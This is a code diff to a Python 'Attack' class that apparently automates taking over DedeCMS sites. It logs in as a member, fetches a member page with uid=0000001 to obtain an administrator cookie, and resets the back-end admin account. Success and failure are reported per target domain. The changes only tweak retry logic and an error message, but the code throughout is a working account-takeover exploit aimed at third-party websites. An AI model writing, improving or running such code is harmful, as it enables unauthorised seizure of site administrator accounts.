@@ -54,11 +54,11 @@ class Attack:
                                         allow_redirects=True, timeout=120, requester=self.session)
                 if "DedeUserID" in requests.utils.dict_from_cookiejar(self.session.cookies).keys():
                     return True
-            if try_count - 1 > 0:
+            if try_count > 0:
                 return self._login_member(try_count - 1)
         except Exception as e:
             traceback.print_exc()
-            if try_count - 1 > 0:
+            if try_count > 0:
                 return self._login_member(try_count - 1)
             else:
                 return False
@@ -66,7 +66,7 @@ class Attack:
     def get_admin_cookie(self):
         res = self._login_member()
         if not res:
-            return {"domain": self.domain, "res": False, "info": "会员页登录失败"}
+            return {"domain": self.domain, "res": False, "info": "会员页登录失败:%s"%self.user}
         try:
             res = utils.my_requests(method="get", url="%s/member/index.php?uid=0000001" % self.domain,
                                     requester=self.session)
@@ -92,7 +92,7 @@ class Attack:
             return True
         except Exception as e:
             traceback.print_exc()
-            if try_count - 1 > 0:
+            if try_count > 0:
                 return self._login_admin(try_count - 1)
             else:
                 return False
@@ -131,7 +131,7 @@ class Attack:
                                         headers=self.heders, params=post_form,
                                         allow_redirects=True, timeout=120, requester=self.session)
                 if "成功" not in res.text:
-                    if try_count - 1 >= 0:
+                    if try_count > 0:
                         return self.reset_back_admin(try_count - 1)
                     else:
                         if "完成详细资料" in res.text:
@@ -141,7 +141,7 @@ class Attack:
                     "info": "成功！！！"}
         except Exception as e:
             traceback.print_exc()
-            if try_count - 1 >= 0:
+            if try_count > 0:
                 return self.reset_back_admin(try_count - 1)
             else:
                 return {"domain": self.domain, "res": False, "info": "失败！！！"}
